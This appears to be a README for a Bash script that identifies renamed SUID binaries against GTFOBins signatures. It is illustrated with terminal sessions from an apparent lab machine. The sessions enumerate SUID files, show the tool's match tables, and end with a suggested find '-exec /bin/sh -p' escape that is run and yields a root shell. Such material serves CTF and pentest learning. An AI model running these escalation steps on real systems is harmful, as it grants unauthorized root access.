🔍 Universal Binary Detective
Find out what any renamed binary REALLY is

📖 What is This?
A simple Bash script that tells you what a binary actually is - even if it's been renamed to something else.

Example: You find /opt/fileS and run the script. It tells you: "This is actually GNU find!"

```
www-data@mzeeav:/home/avuser$ find / -perm -4000 -type f 2>/dev/null
/opt/fileS
/opt/Sus
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
www-data@mzeeav:/home/avuser$
```
## OUTPUT
```
www-data@mzeeav:/tmp$ ./binchecker.sh /opt/Sus

╔══════════════════════════════════════════════════════════════╗                     
║     🔍 UNIVERSAL BINARY DETECTIVE v3.1                     ║                       
║         Find what any renamed binary REALLY is             ║                       
║       Based on GTFOBins + 150+ Linux signatures           ║                        
╚══════════════════════════════════════════════════════════════╝                     
                                                                                     

[>] Scanning: /opt/Sus

═══════════════════════════════════════════════════════════════
📄 Binary: /opt/Sus
═══════════════════════════════════════════════════════════════

[*] Basic Information
  📛 Filename: Sus
  📁 Path: /opt/Sus
  📊 Type:  setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=104705b93a9f751814766a7348238f32b5fb1b87, for GNU/Linux 3.2.0, stripped
  📦 Size: 180K
  🔑 MD5: 2c6caf46f5c3a79feaa6051ce237b495

[*] Permissions & Ownership
  🔐 -rwsr-xr-x  root:root
  ✓ SUID BIT SET! (Potential PrivEsc vector)

[*] Version Output
  sudo: unable to resolve host mzeeav: Name or service not known
  Sudo version 1.9.5p2
  Sudoers policy plugin version 1.9.5p2

[*] Matches
  ✓ Found 7 potential match(es):

  CONFIDENCE   MATCHING BINARY           CATEGORY        DESCRIPTION                        
  ----------   ---------------           --------        -----------                        
   90%  ████████████  su                        Utility         Switch user                        
   80%  ████████████  sudo                      Utility         Execute as root                    
   60%  ████████░░░░  w                         Utility         Logged-in users                    
   60%  ████████░░░░  vi                        Editor          Visual editor                      
   60%  ████████░░░░  service                   System          Service manager                    
   25%  ████░░░░░░░░  pr                        Utility         Format pages                       
   25%  ████░░░░░░░░  ex                        Editor          Ex editor                          

  🏆 BEST MATCH: su (90% confidence)
     📂 Category: Utility
     📝 Description: Switch user

═══════════════════════════════════════════════════════════════
www-data@mzeeav:/tmp$ 

```

EXAMPLE 2 
```
www-data@mzeeav:/tmp$ ./binchecker.sh /opt/fileS

╔══════════════════════════════════════════════════════════════╗                     
║     🔍 UNIVERSAL BINARY DETECTIVE v3.1                     ║                       
║         Find what any renamed binary REALLY is             ║                       
║       Based on GTFOBins + 150+ Linux signatures           ║                        
╚══════════════════════════════════════════════════════════════╝                     
                                                                                     

⚠️  Binary is NOT readable (no read permission)
💡 Try: sudo ./bin_detective.sh /opt/fileS

[>] Scanning: /opt/fileS

═══════════════════════════════════════════════════════════════
📄 Binary: /opt/fileS
═══════════════════════════════════════════════════════════════

[*] Basic Information
  📛 Filename: fileS
  📁 Path: /opt/fileS
  📊 Type:  setuid, setgid executable, regular file, no read permission
  📦 Size: 304K
  🔑 MD5: Unable to read (no permission)

[*] Permissions & Ownership
  🔐 ---s--s--x  root:root
  ✓ SUID BIT SET! (Potential PrivEsc vector)
  ✓ SGID BIT SET!
  ✗ NO READ PERMISSION (cannot inspect internal data)

[*] Version Output
  find (GNU findutils) 4.8.0
  Copyright (C) 2021 Free Software Foundation, Inc.
  License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.

[*] Matches
  ✓ Found 13 potential match(es):

  CONFIDENCE   MATCHING BINARY           CATEGORY        DESCRIPTION                        
  ----------   ---------------           --------        -----------                        
   85%  ████████████  ar                        Utility         Archive creator                    
   80%  ████████████  w                         Utility         Logged-in users                    
   80%  ████████████  Netcat                    Network         Network debugging                  
   80%  ████████████  at                        Scheduler       Job scheduler                      
   60%  ████████░░░░  ps                        Utility         Process status                     
   60%  ████████░░░░  ls                        Utility         List directory                     
   60%  ████████░░░░  free                      Utility         Memory info                        
   60%  ████████░░░░  GNU find                  Search          File search                        
   60%  ████████░░░░  GNU find                  PrivEsc         GTFOBins: SUID find -> shell       
   60%  ████████░░░░  GNU findutils             Search          Find utilities                     
   30%  ████░░░░░░░░  file                      Utility         File type                          
   25%  ████░░░░░░░░  ss                        Network         Socket statistics                  
   25%  ████░░░░░░░░  ex                        Editor          Ex editor                          

  🏆 BEST MATCH: ar (85% confidence)
     📂 Category: Utility
     📝 Description: Archive creator

[*] Manual Analysis (binary unreadable)
  Version output: "find (GNU findutils) 4.8.0
Copyright (C) 2021 Free Software Foundation, Inc.                                    
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>."     
  ✓ This is almost certainly 'find' (GNU findutils)!
    🔧 Try: /opt/fileS . -exec /bin/sh -p \; -quit

═══════════════════════════════════════════════════════════════
www-data@mzeeav:/tmp$
```

```
www-data@mzeeav:/tmp$ /opt/fileS . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# 
```


